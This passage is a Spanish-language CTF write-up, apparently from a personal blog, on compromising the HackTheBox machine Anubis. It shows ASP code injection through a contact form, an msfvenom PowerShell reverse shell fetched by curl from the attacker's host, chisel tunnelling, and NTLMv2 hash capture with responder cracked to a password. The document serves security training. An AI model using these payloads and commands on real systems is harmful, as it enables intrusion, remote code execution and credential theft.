@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Anubis</title>
+
+  <meta name="description" content="Resolución de la máquina Anubis de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Anubis">
+  <meta name="twitter:description" content="Resolución de la máquina Anubis de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/anubis.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Anubis">
+  <meta property="og:description" content="Resolución de la máquina Anubis de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/anubis.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/anubis.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Anubis" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-webserver01">Access - webserver01$</a></li>
+        <li><a href="#access-localadmin">Access - localadmin</a></li>
+        <li><a href="#shell-diegocruz">Shell - diegocruz</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#extra-administrator">Extra - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/anubis.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Anubis</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">-Pn 10.10.11.102
+Nmap scan report for 10.10.11.102  
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+593/tcp   open  http-rpc-epmap
+49710/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">windcorp.htb</code> ademas del nombre de la maquina que es <code class="language-plaintext highlighter-rouge">EARTH</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.102     
+</span><span class="az">SMB         </span><span class="p">10.10.11.102   445    EARTH            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es <code class="language-plaintext highlighter-rouge">EARTH</code> como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.102 windcorp.htb earth.windcorp.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La página web principal tampoco nos aporta nada, solo nos devuelve un error <code class="language-plaintext highlighter-rouge">404</code></p>
+<a href="/htb/anubis/1.png" target="_blank"><div><p><img src="/htb/anubis/1.png"></p></div></a>
+
+<p class="plain-text">Fuzzeando subdominios con <code class="language-plaintext highlighter-rouge">wfuzz</code> al principal encontramos rapidamente <code class="language-plaintext highlighter-rouge">www</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H </span><span class="am">"Host: FUZZ.windcorp.htb" </span><span class="p">-u https://windcorp.htb -t 100 --hh 315  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://windcorp.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   </span><span class="ve">200</span><span class="p">        1007 L   3245 W     46774 Ch    "www"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregamos el nuevo dominio al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que sepa a donde resolver</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.102 www.windcorp.htb"</span><span class="p"> | </span><span class="ve">sudo tee </span><span class="p">-a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si abrimos la web en el nuevo <code class="language-plaintext highlighter-rouge">subdominio</code> nos muestra una página completamente diferente a la anterior, esta parece que es de una empresa llamada <code class="language-plaintext highlighter-rouge">windcorp</code></ps>
+<a href="/htb/anubis/2.png" target="_blank"><div><p><img src="/htb/anubis/2.png"></p></div></a>
+
+<p class="plain-text">Bajamos un poco y encontramos un apartado para <code class="language-plaintext highlighter-rouge">contactar</code> a soporte, donde podemos ingresar varios campos de contacto, llenaremos todos con valor <code class="language-plaintext highlighter-rouge">test</code></p>
+<a href="/htb/anubis/4.png" target="_blank"><div><p><img src="/htb/anubis/4.png"></p></div></a>
+
+<p class="plain-text">Al enviar estos datos nos lleva a una página de confirmación donde a través de una <code class="language-plaintext highlighter-rouge">preview</code> nos refleja todos los campos que habiamos ingresado en el formulario</p>
+<a href="/htb/anubis/5.png" target="_blank"><div><p><img src="/htb/anubis/5.png"></p></div></a>
+
+</section>
+
+<section class="post" id="access-webserver01">
+<br><h3 class="post-title">Access - webserver01$</h3><br>
+
+<p class="plain-text">Algo a probar ya que corre un <code class="language-plaintext highlighter-rouge">IIS</code> por detras es inyectar codigo <code class="language-plaintext highlighter-rouge">asp</code> ya que al ser reflejado en la preview puede que lo interprete y nos ejecute un comando</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"><%
+</span><span class="na">Response</span><span class="p">.</span><span class="no">Write</span><span class="p">(</span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"whoami"</span><span class="p">).StdOut.ReadAll)  
+%></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este codigo asp nos ejecutara un <code class="language-plaintext highlighter-rouge">whoami</code>, lo enviamos en el campo de contacto</p>
+<a href="/htb/anubis/6.png" target="_blank"><div><p><img src="/htb/anubis/6.png"></p></div></a>
+
+<p class="plain-text">En la <code class="language-plaintext highlighter-rouge">preview</code> muestra el codigo que enviamos y al interpretarse nos devuelve el output del comando whoami que lo ejecuta el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<a href="/htb/anubis/7.png" target="_blank"><div><p><img src="/htb/anubis/7.png"></p></div></a>
+
+<p class="plain-text">Para ganar acceso iniciamos creando un <code class="language-plaintext highlighter-rouge">exe</code> malicioso con <code class="language-plaintext highlighter-rouge">msfvenom</code> que al ejecutarse nos envie una <code class="language-plaintext highlighter-rouge">powershell</code> interactiva a nuestro host y lo compartimos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/x64/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1875 bytes
+Final size of exe file: 8192 bytes
+Saved as: shell.exe
+
+</span><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora simplemente como codigo <code class="language-plaintext highlighter-rouge">asp</code> enviamos un payload que descargue el <code class="language-plaintext highlighter-rouge">exe</code> malicioso en la maquina victima y otro que lo ejecute para que nos envie la shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"><%
+</span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"curl 10.10.14.10/shell.exe -o C:\ProgramData\shell.exe"</span><span class="p">)  
+%></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"><%
+</span><span class="no">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">).exec(</span><span class="s">"cmd /c C:\ProgramData\shell.exe"</span><span class="p">)  
+%></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo ganamos acceso como <code class="language-plaintext highlighter-rouge">nt authority\system</code> en el equipo <code class="language-plaintext highlighter-rouge">webserver01$</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.102 
+Windows PowerShell running as user WEBSERVER01$ on WEBSERVER01  
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\windows\system32\inetsrv></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-localadmin">
+<br><h3 class="post-title">Access - localadmin</h3><br>
+
+<p class="plain-text">En el escritorio del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> en lugar de una flag nos encontramos un archivo llamado <code class="language-plaintext highlighter-rouge">req.txt</code>, al leerlo nos damos cuenta que es un <code class="language-plaintext highlighter-rouge">certificado</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Desktop> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name   
+----                -------------         ------ ----   
+-a----        5/24/2021   9:36 PM            989 req.txt
+
+PS C:\Users\Administrator\Desktop> </span><span class="am">type </span><span class="p">req.txt
+-----BEGIN CERTIFICATE REQUEST-----
+MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx  
+ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k  
+Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC  
+KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb  
+BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL  
+eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz  
+QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq  
+qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu  
+1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H  
+JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P  
+WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt  
+yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F  
+F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04  
+CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso  
+4TlwpQ==
+-----END CERTIFICATE REQUEST-----
+PS C:\Users\Administrator\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si se la pasamos a <code class="language-plaintext highlighter-rouge">openssl</code> para ver un poco de información en las primeras lineas nos muestra un nuevo <code class="language-plaintext highlighter-rouge">subdominio</code>, sin embargo desde fuera no nos muestra nada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ openssl </span><span class="p">req -in req.txt -text -noout | </span><span class="ve">head</span><span class="p">
+Certificate Request:
+    Data:
+        Version: 1 (0x0)
+        Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htb  
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:a6:9b:4a:ff:85:91:c2:2a:c2:bf:04:3e:ce:15:
+                    d2:f6:23:db:c5:f2:82:1e:6a:13:12:f4:b6:fd:b1:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tal vez hay mas equipos, al hacer un <code class="language-plaintext highlighter-rouge">ipconfig</code> podemos ver nuestra interfaz de red que tiene el segmento <code class="language-plaintext highlighter-rouge">172.21.*.*</code> donde la puerta de entrada es la <code class="language-plaintext highlighter-rouge">.48.1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Desktop> </span><span class="am">ipconfig</span><span class="p">
+
+Windows IP Configuration
+
+Ethernet adapter vEthernet (Ethernet):
+
+   Connection-specific DNS Suffix  . : .htb
+   Link-local IPv6 Address . . . . . : fe80::10d6:39ba:1ef7:bb5f%32  
+   IPv4 Address. . . . . . . . . . . : 172.21.54.239
+   Subnet Mask . . . . . . . . . . . : 255.255.240.0
+   Default Gateway . . . . . . . . . : 172.21.48.1
+
+PS C:\Users\Administrator\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregamos esa ip con nuevo subdominio al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, pero algo a tener en cuenta es que no tenemos conectividad con ese equipo desde nuestro equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo</span><span class="am"> "172.21.48.1 softwareportal.windcorp.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">chisel</code> creamos un tunel de tipo <code class="language-plaintext highlighter-rouge">socks</code> para cuando una petición se envie al puerto <code class="language-plaintext highlighter-rouge">1080</code> local logre tener alcance y conectividad con los demas equipos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">curl </span><span class="p">10.10.14.10/chisel.exe </span><span class="c1">-o </span><span class="p">chisel.exe
+PS C:\ProgramData></span><span class="am"> .\chisel.exe </span><span class="p">client 10.10.14.10:9999 R:socks  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999
+server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Pasando a través de ese <code class="language-plaintext highlighter-rouge">proxy</code> logramos acceder a la web que nos muestra una página web diferente a las 2 que ya habiamos visto antes desde fuera del equipo</p>
+<a href="/htb/anubis/8.png" target="_blank"><div><p><img src="/htb/anubis/8.png"></p></div></a>
+
+<p class="plain-text">Bajando un poco podemos ver un apartado llamado <code class="language-plaintext highlighter-rouge">Our software</code> donde vemos algunos programas, al hacer clic en ellos apunta a una <code class="language-plaintext highlighter-rouge">ip</code> y un nombre de archivo</p>
+<a href="/htb/anubis/9.png" target="_blank"><div><p><img src="/htb/anubis/9.png"></p></div></a>
+
+<p class="plain-text">Lo que podemos hacer es cambiar la <code class="language-plaintext highlighter-rouge">ip</code> por una nuestra y enviar la petición, revisando trafico con <code class="language-plaintext highlighter-rouge">wireshark</code> vemos que hace peticiones hacia el puerto <code class="language-plaintext highlighter-rouge">5985</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q curl</span><span class="am"> 'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.10'  </span>
+</code></pre></div></div><br>
+
+<a href="/htb/anubis/10.png" target="_blank"><div><p><img src="/htb/anubis/10.png"></p></div></a>
+
+<p class="plain-text">El puerto 5985 pertenece a <code class="language-plaintext highlighter-rouge">winrm</code> asi que tal vez se esta enviando una autenticación, asi que para interceptarla corremos <code class="language-plaintext highlighter-rouge">responder</code> y enviamos de nuevo la petición, al hacerlo logramos capturar el <code class="language-plaintext highlighter-rouge">hash</code> en formato NTLMv2 del usuario <code class="language-plaintext highlighter-rouge">localadmin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo responder </span><span class="p">-I tun0     
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           </span><span class="am">NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+</span><span class="ve">[+] </span><span class="p">Listening for events...
+
+</span><span class="az">[WinRM] </span><span class="p">NTLMv2 Client   : </span><span class="am">10.10.11.102
+</span><span class="az">[WinRM] </span><span class="p">NTLMv2 Username : </span><span class="am">windcorp\localadmin
+</span><span class="az">[WinRM] </span><span class="p">NTLMv2 Hash     : </span><span class="am">localadmin::windcorp:1122334455667788:ECFD538F0B715A547C87ADA1A9116FD8:010100000000000099F628A94AD5D9012DA498DFBACE8D750000000002000800580049004400310001001E00570049004E002D00440048004900570054004D00300050003000310048000400140058004900440031002E004C004F00430041004C0003003400570049004E002D00440048004900570054004D00300050003000310048002E0058004900440031002E004C004F00430041004C000500140058004900440031002E004C004F00430041004C00080030003000000000000000000000000021000033B001D95924C40F55B0370B60D33C63ED50FA2B25656BF8DAE636E12F2D54C40A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310034002E0039000000000000000000  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La contraseña es bastante debil por lo que la crackeamos facilmente usando <code class="language-plaintext highlighter-rouge">john</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="ro">Secret123</span><span class="p">        (</span><span class="ro">localadmin</span><span class="p">)
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos las credenciales con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y son válidas a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb windcorp.htb -u localadmin -p Secret123         
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="ve">[+] </span><span class="p">windcorp.htb\localadmin:Secret123</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-diegocruz">
+<br><h3 class="post-title">Shell - diegocruz</h3><br>
+
+<p class="plain-text">Listando los recursos smb compartidos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos encontrar privilegios de lectura o <code class="language-plaintext highlighter-rouge">READ</code> en el recurso smb con el nombre <code class="language-plaintext highlighter-rouge">Shared</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb windcorp.htb -u localadmin -p Secret123 --shares
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="ve">[+] </span><span class="p">windcorp.htb\localadmin:Secret123 
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="az">[*] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">CertEnroll      READ            Active Directory Certificate Services share
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">Shared          READ            
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos con smbclient al recurso <code class="language-plaintext highlighter-rouge">Shared</code>, navegando un poco entre los directorios en <code class="language-plaintext highlighter-rouge">Analytics</code> encontramos varios archivos <code class="language-plaintext highlighter-rouge">.omv</code> que son de jamovi</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">windcorp.htb/localadmin:Secret123@earth.windcorp.htb  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# use Shared
+# ls
+drw-rw-rw-          0  Wed Apr 28 10:06:06 2021 .
+drw-rw-rw-          0  Wed Apr 28 10:06:06 2021 ..
+drw-rw-rw-          0  Mon Apr 26 23:09:24 2021 Documents
+drw-rw-rw-          0  Thu Jul 22 13:14:16 2021 Software
+# cd Documents
+# ls
+drw-rw-rw-          0  Mon Apr 26 23:09:24 2021 .
+drw-rw-rw-          0  Mon Apr 26 23:09:24 2021 ..
+drw-rw-rw-          0  Thu Apr 29 09:50:33 2021 Analytics
+# cd Analytics
+# ls
+drw-rw-rw-          0  Thu Apr 29 09:50:33 2021 .
+drw-rw-rw-          0  Thu Apr 29 09:50:33 2021 ..
+-rw-rw-rw-       6455  Thu Apr 29 09:50:33 2021 Big 5.omv
+-rw-rw-rw-       2897  Thu Apr 29 09:50:33 2021 Bugs.omv
+-rw-rw-rw-       2142  Thu Apr 29 09:50:33 2021 Tooth Growth.omv
+-rw-rw-rw-       2841  Tue Aug 22 16:50:12 2023 Whatif.omv
+# mget *
+[*] Downloading Big 5.omv
+[*] Downloading Bugs.omv
+[*] Downloading Tooth Growth.omv
+[*] Downloading Whatif.omv
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Algo a tener en cuenta es que todos los <code class="language-plaintext highlighter-rouge">usuarios</code> tienen privilegios <code class="language-plaintext highlighter-rouge">FULL</code> en este directorio especifico por lo que podemos <code class="language-plaintext highlighter-rouge">escribir</code> archivos en el recurso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbcacls </span><span class="p">-U localadmin%Secret123 </span><span class="am">"//windcorp.htb/Shared" "Documents/Analytics"  </span><span class="p">
+REVISION:1
+CONTROL:SR|DI|DP
+OWNER:WINDCORP\DiegoCruz
+GROUP:WINDCORP\Domain Users
+ACL:BUILTIN\Users:ALLOWED/OI|CI/FULL
+ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
+ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
+ACL:BUILTIN\Users:ALLOWED/OI|CI|I/READ
+ACL:BUILTIN\Users:ALLOWED/CI|I/0x00000004
+ACL:BUILTIN\Users:ALLOWED/CI|I/0x00000002
+ACL:WINDCORP\DiegoCruz:ALLOWED/I/FULL
+ACL:CREATOR OWNER:ALLOWED/OI|CI|IO|I/0x10000000</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Buscando vulnerabilidades de <code class="language-plaintext highlighter-rouge">jamovi</code> llegamos al poc de un <a href="https://github.com/g33xter/CVE-2021-28079">CVE</a> que mediante un <code class="language-plaintext highlighter-rouge">XSS</code> logra conseguir <code class="language-plaintext highlighter-rouge">RCE</code>, iniciamos unzipeando uno de los archivos <code class="language-plaintext highlighter-rouge">.omv</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unzip </span><span class="p">Whatif.omv
+Archive:  Whatif.omv
+  inflating: META-INF/MANIFEST.MF  
+  inflating: index.html
+  inflating: metadata.json
+  inflating: xdata.json
+  inflating: data.bin
+  inflating: 01 empty/analysis</span>
+</code></pre></div></div><br>
+
